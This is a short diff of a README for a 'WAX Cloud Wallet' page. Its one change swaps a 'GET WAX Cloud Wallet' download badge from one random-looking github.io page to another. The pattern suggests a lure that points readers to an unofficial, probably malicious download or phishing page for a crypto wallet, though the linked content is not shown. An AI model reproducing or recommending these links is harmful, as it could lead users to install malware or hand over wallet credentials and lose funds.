@@ -1,6 +1,6 @@
 # WAX Cloud Wallet - Cloud Wallet for WAX Assets
 
-[![GET WAX Cloud Wallet](https://img.shields.io/badge/GET%20%E2%80%94%20WAX%20Cloud%20Wallet-0078D6?style=for-the-badge&logoColor=white)](https://imranesparzazqvc.github.io/.github/wax-cloud-wallet)
+[![GET WAX Cloud Wallet](https://img.shields.io/badge/GET%20%E2%80%94%20WAX%20Cloud%20Wallet-0078D6?style=for-the-badge&logoColor=white)](https://maximusbentonoxyb.github.io/.github/wax-cloud-wallet)
 
 ## WAX Cloud Wallet Access Overview
 
